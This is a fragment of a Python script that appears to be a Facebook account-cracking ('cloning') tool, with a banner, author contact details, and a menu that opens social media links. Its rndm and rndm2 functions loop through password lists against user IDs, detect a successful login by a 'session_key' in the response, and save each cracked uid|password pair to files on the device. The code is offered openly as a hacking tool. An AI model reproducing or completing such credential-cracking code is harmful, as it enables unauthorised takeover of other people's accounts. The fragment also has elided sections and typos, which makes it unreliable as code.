...
print('\n\033[1;31m ⚡𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 AhMeD  𝙷𝙰𝙲𝙺 𝙵𝙱 𝙲𝙻𝙾𝙽𝙴𝙸𝙽𝙶 𝚃𝙾𝙾𝙻𝚂 ⚡');time.sleep(3)


print('\n\033[1;32m亗𝙏𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙊𝙐𝙍 𝙏𝙊𝙊𝙇𝙎亗' );time.sleep(1)
os.system('xdg-open https://www.Youtube.com//@Quranulkareem.1')
logo = """
\033[1;90m   
      \033[1;32m 
...
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    : AhMeD
》FACEBOOK  : *********(:
》GITHUB        : TVAHMED 
》WHATSAPP : +923277025198
》TAEM           : JuST oNe HaCkEr 🕶️
\033[1;31m------------------------------------------------
"""
def linex():
	print('\033[1;37m----------------------------------------------')
...
def menu():
			...
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['03','3']:
				os.system('xdg-opopenhttps://www.facebook.com/profile.php?id=100058243645491')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def awmafghan():
		...
		os.system('xdg-open  https://t.me/Dark_Night_Hack')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AhMeD  HACK-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AhMeD  HACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AhMeD  HACK-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AhMeD  HACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AhMeD  HACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AhMeD  HACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AhMeD  HACK-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
